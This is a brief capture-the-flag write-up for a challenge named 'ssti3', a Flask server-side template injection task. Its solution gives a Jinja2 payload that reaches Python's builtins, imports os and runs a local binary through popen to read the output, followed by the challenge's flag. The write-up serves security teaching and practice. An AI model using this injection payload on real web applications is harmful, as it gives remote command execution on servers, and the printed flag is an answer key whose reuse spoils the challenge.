# ssti3

## What it is

Same as ssti2 but the flag is not in app.py or in a file.

Files in the directory:
```
app.py
config.py
getFlag
index.html
```

```getFlag``` is an elf file.

## Solution

Run ```getFlag```:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('./getFlag').read()}}
```

flag: ```BFS{Oh_My..._I_Can_RCE_PyTh0N!!}```
